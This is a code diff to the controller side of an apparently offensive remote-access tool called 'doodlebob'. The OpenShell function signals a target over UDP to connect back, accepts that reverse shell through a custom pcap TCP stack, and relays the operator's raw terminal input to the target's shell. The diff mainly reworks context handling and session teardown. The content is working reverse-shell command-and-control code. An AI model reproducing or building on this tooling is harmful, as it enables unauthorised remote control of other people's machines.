@@ -12,7 +12,6 @@ import (
 	"os"
 	"os/signal"
 	"strconv"
-	"syscall"
 	"time"
 
 	"github.com/MeHungr/doodlebob/internal/message"
@@ -112,6 +111,7 @@ func Heartbeat(udpTarget, targetIP, targetPort, srcIP, srcPort string) error {
 
 // OpenShell opens a listener on the control host for a reverse shell from the target
 func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellType) error {
+	// Obtains the source ip and picks a random port for the reverse shell
 	rawIP := network.LocalIP().String()
 	srcPort := rand.Intn(45000) + 10000
 	srcIP, _, err := net.SplitHostPort(rawIP)
@@ -120,23 +120,15 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 	}
 
 	// ========= PCAP TCP STACK ==========
-	signalCtx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
+	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
 	defer stop()
 
-	sessionCtx, cancelSession := context.WithCancel(signalCtx)
-	defer cancelSession()
-
-	setupCtx, cancelTimeout := context.WithTimeout(sessionCtx, 10*time.Second)
-	defer cancelTimeout()
+	setupCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
+	defer cancel()
 
 	pool, err := netip.ParsePrefix("172.16.0.0/16")
 	if err != nil {
-		return fmt.Errorf("invalid \"-subnet:\" %w", err)
-	}
-
-	virtualIP, err := netip.ParseAddr("172.16.0.1")
-	if err != nil {
-		return err
+		return fmt.Errorf("invalid -subnet: %w", err)
 	}
 
 	addr := network.LocalIP().IP
@@ -145,157 +137,114 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 	if err != nil {
 		return fmt.Errorf("invalid interface: %w", err)
 	}
+	virtualIP, err := netip.ParseAddr("172.16.0.1")
+	if err != nil {
+		return fmt.Errorf("invalid virtual ip: %w", err)
+	}
 
 	udpCfg := pcapnet.UDPConfig{DeviceName: device.Name, LocalIP: localIP, LocalPort: uint16(srcPort), ReserveUDPPort: true}
 	serverCfg := pcapnet.ServerConfig{VirtualIP: virtualIP, AddressPool: pool, MTU: 1200, MaxPeers: 1}
 
-	listener, err := pcapnet.ListenPCAPTCP(setupCtx, udpCfg, serverCfg, srcPort)
+	var listener *pcapnet.TCPServer
+	listener, err = pcapnet.ListenPCAPTCP(setupCtx, udpCfg, serverCfg, srcPort)
 	if err != nil {
 		return fmt.Errorf("opening shell listener: %w", err)
 	}
 	defer listener.Close()
 	// ========= PCAP TCP STACK ==========
 
-	portStr := strconv.Itoa(srcPort)
-	if err := sendShell(udpTarget, targetIP, targetPort, srcIP, portStr, shellType); err != nil {
-		return fmt.Errorf("sending shell message: %w", err)
-	}
-
 	type connResult struct {
 		conn net.Conn
-		peer pcapnet.Peer
 		err  error
 	}
 	ch := make(chan connResult, 1)
 
 	go func() {
-		c, peer, e := listener.AcceptWithPeer()
-		ch <- connResult{conn: c, peer: peer, err: e}
+		c, e := listener.Accept()
+		ch <- connResult{conn: c, err: e}
 	}()
 
-	go func() {
-		<-sessionCtx.Done()
-		listener.Close()
-	}()
+	portStr := strconv.Itoa(srcPort)
+	if err := sendShell(udpTarget, targetIP, targetPort, srcIP, portStr, shellType); err != nil {
+		return fmt.Errorf("sending shell message: %w", err)
+	}
 
 	var res connResult
 	select {
 	case res = <-ch:
-	case <-sessionCtx.Done():
-		return sessionCtx.Err()
+	case <-ctx.Done():
+		return ctx.Err()
 	}
 
 	if res.err != nil {
-		if sessionCtx.Err() != nil {
-			return sessionCtx.Err()
-		}
 		return fmt.Errorf("accepting connection: %w", res.err)
 	}
-
 	conn := res.conn
 	defer conn.Close()
 
-	fmt.Printf("[+] Target connected from %s!\nOpening doodlebob terminal >:3\n", conn.RemoteAddr())
+	fmt.Printf("[+] Target connected from %s!\nOpening doodlebob terminal >:3\n", conn.RemoteAddr().String())
 
-	var oldState *term.State
 	switch shellType {
 	case message.ShellNativePty, message.ShellPcapPty:
-		oldState, err = term.MakeRaw(int(os.Stdin.Fd()))
+		oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
 		if err != nil {
-			return fmt.Errorf("setting raw terminal: %w", err)
+			return err
 		}
-	}
-
-	restoreTerminal := func() {
-		if oldState != nil {
+		defer func() {
 			_ = term.Restore(int(os.Stdin.Fd()), oldState)
-			oldState = nil
-		}
+		}()
 	}
-	defer restoreTerminal()
 
-	// Ensure background closures break network operations
+	done := make(chan struct{})
+
+	// Force close the socket if local Ctrl+C hits to unblock io.Copy
 	go func() {
-		<-sessionCtx.Done()
-		_ = conn.Close()
+		select {
+		case <-ctx.Done():
+			_ = conn.Close()
+		case <-done:
+		}
 	}()
 
-	// Channel to cleanly signal the termination of the entire interactive session
-	sessionDone := make(chan struct{})
-
-	// Loop 1: Remote TCP Connection -> Local Standard Output (Synchronous Pump)
+	// Stream incoming target shell output to control terminal
 	go func() {
 		_, _ = io.Copy(os.Stdout, conn)
-		close(sessionDone) // The remote host closed the session! Unblock the main stream immediately.
+		fmt.Println("\r\n[-] Target disconnected.\r\n")
+		close(done)
 	}()
 
-	// Loop 2: Non-blocking Local Stdin -> Remote TCP Connection (Select/FdSet Driven)
+	// FIXED: Watchdog to force break the blocking os.Stdin.Read loop on FreeBSD when target exits
 	go func() {
-		defer cancelSession()
-
-		fd := int(os.Stdin.Fd())
-		// Set standard input to non-blocking mode at the OS level
-		if err := syscall.SetNonblock(fd, true); err != nil {
-			return
+		<-done
+		// Find our own process and deliver a SIGINT to trigger the signal context shutdown
+		p, err := os.FindProcess(os.Getpid())
+		if err == nil {
+			_ = p.Signal(os.Interrupt)
 		}
-		defer func() { _ = syscall.SetNonblock(fd, false) }()
+	}()
 
+	// Stream keyboard straight into the connection
+	go func() {
 		buf := make([]byte, 1024)
-
 		for {
 			select {
-			case <-sessionDone:
+			case <-done:
 				return
-			case <-sessionCtx.Done():
+			case <-ctx.Done():
 				return
 			default:
-				// Build a file descriptor set for low-level monitoring
-				fdSet := &syscall.FdSet{}
-				fdSet.Bits[fd/64] |= 1 << (uint(fd) % 64)
-
-				// Small polling timeout (50ms) ensures we frequently check the context channels
-				timeout := &syscall.Timeval{Usec: 50000}
-
-				// Check if Stdin is ready to be read without blocking the system thread
-				nReady, err := syscall.Select(fd+1, fdSet, nil, nil, timeout)
-				if err != nil {
-					if err == syscall.EINTR {
-						continue
-					}
-					return
+				n, err := os.Stdin.Read(buf)
+				if n > 0 {
+					_, _ = conn.Write(buf[:n])
 				}
-
-				if nReady > 0 {
-					n, err := syscall.Read(fd, buf)
-					if n > 0 {
-						_, writeErr := conn.Write(buf[:n])
-						if writeErr != nil {
-							return
-						}
-					}
-					if err != nil {
-						if err == syscall.EAGAIN || err == syscall.EWOULDBLOCK {
-							continue
-						}
-						return
-					}
+				if err != nil {
+					return
 				}
 			}
 		}
 	}()
 
-	// Wait for the session to finish (Remote typing exit triggers sessionDone)
-	<-sessionDone
-
-	// --- EXPLICIT TEARDOWN SEQUENCE ---
-	restoreTerminal()
-	fmt.Print("\r\n[-] Target disconnected.\r\n")
-
-	// Disconnect the pcapnet session allocation pool
-	disconnectCtx, cancelDisconnect := context.WithTimeout(context.Background(), 1*time.Second)
-	_ = listener.DisconnectPeer(disconnectCtx, res.peer)
-	cancelDisconnect()
-
+	<-done
 	return nil
 }
 
